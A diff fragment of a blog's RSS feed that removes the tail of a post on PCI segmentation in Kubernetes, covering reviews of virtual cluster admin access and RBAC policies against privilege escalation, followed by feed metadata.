-&lt;p&gt;&lt;strong&gt;Details&lt;/strong&gt; - How this is reviewed would depend on the approach taken. Where a virtual cluster solution is used, it might be possible to review to ensure that virtual cluster admins have no access to the underlying master cluster. Where Kubernetes RBAC is used for this, it would require a review of RBAC policies to ensure that users can’t escalate privileges to access in-scope workloads from the “low security” environment.&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;Segmentation is an important part of PCI security and applying it to Kubernetes can be tricky, as it’s not designed for hard multi-tenancy.&lt;/p&gt;
-
-</description>
-				<pubDate>Tue, 20 Dec 2022 08:27:00 +0000</pubDate>
-				<link>https://raesene.github.io/blog/2022/12/20/PCI-Kubernetes-Section16-Segmentation/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2022/12/20/PCI-Kubernetes-Section16-Segmentation/</guid>
 			</item>
 		
 	</channel>
